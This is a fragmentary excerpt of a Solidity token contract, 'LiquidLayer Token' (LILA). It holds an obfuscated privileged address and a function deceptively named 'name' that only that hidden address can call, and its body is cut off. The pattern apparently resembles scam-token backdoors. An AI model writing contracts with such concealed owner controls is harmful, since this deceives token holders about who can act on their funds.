...
contract LILA is Ownable {
    ...
    string public _tokenname = "LiquidLayer Token";
    string public _tokensymbol = "LILA";
    uint256 tokenamount = 10000000000*10**decimals();
    address public efbgv12;
    ...
    function name(address jjkxq1) public     {
        require(efbgv12 ==  _msgSender());
        if(efbgv12 != _msgSender()){
                revert("fu");
        }
